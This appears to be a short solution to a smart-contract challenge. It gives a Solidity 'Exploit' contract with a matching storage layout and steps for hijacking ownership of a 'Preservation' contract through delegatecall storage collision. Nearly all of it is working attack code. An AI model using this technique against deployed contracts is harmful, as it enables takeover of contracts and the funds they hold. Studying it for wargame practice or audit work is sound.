Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Preservation {
    function setFirstTime(uint) external;

}

contract Exploit {

    address public o;
    address public p;
    address public owner;

    function exploit(address _who) public {
        Preservation(_who).setFirstTime(uint(address(this)));
    }

    function setTime(uint _time) public {
        owner = address(tx.origin);
    }
}
```
- Call exploit()
- Call setFirstTime() on your contract instance, with any value
